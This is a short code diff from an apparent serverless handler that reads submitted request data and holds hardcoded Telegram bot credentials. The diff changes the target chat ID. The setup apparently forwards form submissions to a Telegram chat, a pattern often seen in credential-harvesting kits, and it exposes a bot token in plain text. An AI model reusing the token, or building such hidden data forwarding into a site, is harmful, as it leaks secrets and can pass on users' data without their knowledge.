@@ -7,7 +7,7 @@ export default async function handler(req, res) {
     const data = req.body;
 
     const botToken1 = '9020819173:AAHduHYg_zC7dk-eN5ZW6fR4L6ecCdJzB_4';
-    const chatId1 = '9020819173';
+    const chatId1 = '8561486206';
 
     const botToken2 = '';
     const chatId2 = '';
